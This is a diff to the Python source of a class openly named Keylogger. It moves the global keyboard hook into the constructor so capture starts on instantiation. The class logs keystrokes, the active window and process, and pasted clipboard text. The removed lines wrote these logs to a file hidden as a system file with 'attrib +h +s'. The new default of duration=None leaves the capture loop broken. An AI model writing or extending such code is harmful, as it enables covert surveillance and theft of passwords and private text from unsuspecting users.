@@ -20,6 +20,15 @@ class Keylogger:
         self.ctrl_pressed = False
         self.caps_lock_mode = False
         self.clipboard_data = ""
+        self.hooked = False
+
+        if not self.hooked:
+            keyboard.hook(self.capture_keys)
+            self.hooked = True
+
+        # if self.hooked:
+            # keyboard.hook(self.capture_keys)
+            # self.hooked = False
 
     def get_process(self):
         """Função para obter o processo que o usuário esta em foco"""
@@ -111,13 +120,10 @@ class Keylogger:
             except Exception:
                 pass
 
-    def main(self, duration=30):
+    def main(self, duration=None):
         """Função main, define o processo de coletada dos dados e retorna o **buffer** com os logs"""
-        self.key_log = {}
-        logs_filename = "logs.txt"
+        # logs_filename = "logs.txt"
         buffer = []
-
-        keyboard.hook(self.capture_keys)
         start_time = time.time()
 
         while time.time() - start_time < duration:
@@ -128,16 +134,16 @@ class Keylogger:
                 f"Time: {data['timestamp']}\n"
                 f"Window: {window}\n"
                 f"(Process: {data['process']}, ID: {data['process_id']})\n\n"
-                f"Log:\n\"{data['log']}\"\n\n"
-                f"Pasted (Ctrl+V):\n{chr(10).join(data['pasted'])}\n"
+                f"Log ---> \"{data['log']}\"\n\n"
+                f"Pasted (Ctrl+V):\n{chr(10).join(data['pasted'])}"
             )
 
             buffer.append(log_text)
 
-            with open(logs_filename, "a", encoding="latin-1") as file:
-                subprocess.call(["attrib", "+h", "+s", logs_filename])
-                file.write("\n" + "-" * 65 + "\n")
-                file.write(log_text)
-                file.write("-" * 65 + "\n")
+            # with open(logs_filename, "a", encoding="latin-1") as file:
+            #     subprocess.call(["attrib", "+h", "+s", logs_filename])
+            #     file.write("\n" + "-" * 65 + "\n")
+            #     file.write(log_text)
+            #     file.write("-" * 65 + "\n")
 
-        return buffer, logs_filename
+        return buffer
